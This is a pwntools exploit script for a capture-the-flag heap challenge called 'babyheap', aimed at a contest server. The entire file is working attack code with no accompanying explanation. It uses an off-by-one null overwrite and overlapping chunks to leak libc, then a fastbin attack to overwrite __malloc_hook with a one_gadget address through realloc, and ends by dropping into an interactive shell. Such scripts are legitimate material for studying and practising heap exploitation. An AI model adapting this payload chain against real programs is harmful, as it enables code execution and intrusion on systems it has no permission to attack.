from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "babyheap.2018.teamrois.cn"
remote_port = 3154
local_addr = "127.0.0.1"
local_port = 1807

pc = "./babyheap"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 1

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0xD43+0x555555554000\n b*0xF25+0x555555554000')
		#b *0x0804887F \n 
		#0x400b6a

def ru(a):
	return p.recvuntil(a)

def sn(a):
	p.send(a)

def rl():
	return p.recvline()

def sl(a):
	p.sendline(a)

def rv(a):
	return p.recv(a)

def raddr(a,l=None):
	if l == None:
		return u64(rv(a).ljust(8,'\x00'))
	else:
		return u64(rl().strip('\n').ljust(8,'\x00'))

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def sa(a,b):
	p.sendafter(a,b)

def sla(a,b):
	p.sendlineafter(a,b)
	
def alloc_chunk(len,content):
	sla('choice: ','1')
	sla('size: ',str(len))
	sla('content: ',content)

def show_chunk(index):
	sla('choice: ','2')
	sla('index: ',str(index))


def del_chunk(index):
	sla('choice: ','3')
	sla('index: ',str(index))

def hack():
	raw_input()
	alloc_chunk(0x48,'A')
	payload = (p64(0x100) + p64(0x21))*15 + p64(0x100) + '\x21'
	alloc_chunk(0xf9,payload)
	alloc_chunk(0xf9,'A')
	alloc_chunk(0x68,'A')
	alloc_chunk(0x48,'A')

	del_chunk(1)
	del_chunk(0)
	payload = 'A'*0x48
	alloc_chunk(0x48,payload)

	alloc_chunk(0x98,'A')
	alloc_chunk(0x58,'A')

	del_chunk(1)
	del_chunk(2)

	alloc_chunk(0x98,'A')
	show_chunk(5)
	ru('content: ')
	top_addr = u64(rv(6).ljust(8,'\x00'))
	lg('top_addr',top_addr)

	libc.address = top_addr - 0x58 - 0x3C4B20
	lg('libc.address',libc.address)

	malloc_hook = libc.symbols['__malloc_hook']
	lg('malloc_hook',malloc_hook)

	# one_gadget0 = libc.address + 0x45216
	# one_gadget1 = libc.address + 0x4526a
	# one_gadget2 = libc.address + 0xf02a4
	one_gadget3 = libc.address + 0xf1147
	# system_addr = libc.symbols['system']
	# lg('system_addr',system_addr)

	fake_fd = malloc_hook - 0x28 + 5

	alloc_chunk(0x68,'A')

	del_chunk(5)
	del_chunk(3)
	del_chunk(2)

	alloc_chunk(0x68,p64(fake_fd))
	alloc_chunk(0x68,'A')
	alloc_chunk(0x68,'A')

	realloc_addr = libc.symbols['realloc']
	lg('realloc',realloc_addr)
	payload = 'A'*0x3 + p64(one_gadget3)*2 + p64(realloc_addr)
	alloc_chunk(0x68,payload)

	#alloc_chunk(0x20,'A')
	sla('choice: ','1')
	sla('size: ',str(1))
	
	p.interactive()

hack()